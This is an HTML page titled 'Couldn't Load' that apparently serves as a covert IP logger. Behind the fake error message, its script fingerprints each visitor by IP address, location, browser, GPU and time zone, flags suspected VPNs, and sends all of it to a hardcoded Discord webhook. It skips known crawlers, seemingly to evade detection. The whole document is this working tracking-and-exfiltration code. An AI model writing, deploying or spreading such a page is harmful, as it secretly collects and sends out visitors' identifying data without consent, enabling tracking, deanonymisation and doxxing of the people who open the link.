<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Couldn’t Load</title>
</head>
<body>
  <h1>Couldn’t Load</h1>
  <script>
    // Replace with your actual Discord webhook
    const webhookUrl = "https://discord.com/api/webhooks/1339682550070775808/yhGhuZVZUxCgIX5vD196grlVzQDz_1o692fU8R2DmQ8Y8dgZ_SKD7sgBiYG0_MjNt9yf";

    function isLikelyBot(userAgent) {
      const botPatterns = [
        /bot/i,
        /crawl/i,
        /spider/i,
        /slurp/i,
        /bingpreview/i,
        /facebookexternalhit/i,
        /monitor/i
      ];
      return botPatterns.some(pattern => pattern.test(userAgent));
    }

    function getGPU() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "Unknown";
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return debugInfo
          ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          : "Unknown";
      } catch (e) {
        return "Unknown";
      }
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      let name = "Unknown";
      let version = "Unknown";

      if (ua.indexOf("Firefox") > -1) {
        name = "Firefox";
        version = ua.match(/Firefox\/([0-9\.]+)/)[1];
      } else if (ua.indexOf("Edg") > -1) {
        name = "Edge";
        version = ua.match(/Edg\/([0-9\.]+)/)[1];
      } else if (ua.indexOf("Chrome") > -1) {
        name = "Chrome";
        version = ua.match(/Chrome\/([0-9\.]+)/)[1];
      } else if (ua.indexOf("Safari") > -1) {
        name = "Safari";
        version = ua.match(/Version\/([0-9\.]+)/)[1];
      }

      return `${name} ${version}`;
    }

    const userAgent = navigator.userAgent;
    if (isLikelyBot(userAgent)) {
      console.log("Bot or crawler detected, skipping post.");
    } else {
      fetch("https://ipapi.co/json")
        .then(response => response.json())
        .then(ipData => {
          const suspectVPN = ipData.org && (
            ipData.org.toLowerCase().includes("vpn") ||
            ipData.org.toLowerCase().includes("proxy") ||
            ipData.org.toLowerCase().includes("hosting")
          );

          const gpu = getGPU();
          const browser = getBrowser();
          const currentTime = new Date().toLocaleString();
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

          const content = `
New visitor:
IP: ${ipData.ip}
City: ${ipData.city}, ${ipData.region}, ${ipData.country}
User-Agent: ${userAgent}
Browser: ${browser}
GPU: ${gpu}
Time: ${currentTime}
Time Zone: ${timezone}
VPN Suspected: ${suspectVPN}
          `;

          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              content: content
            })
          });
        })
        .catch(err => {
          console.error("Error getting IP info or posting to webhook", err);
        });
    }
  </script>
</body>
</html>
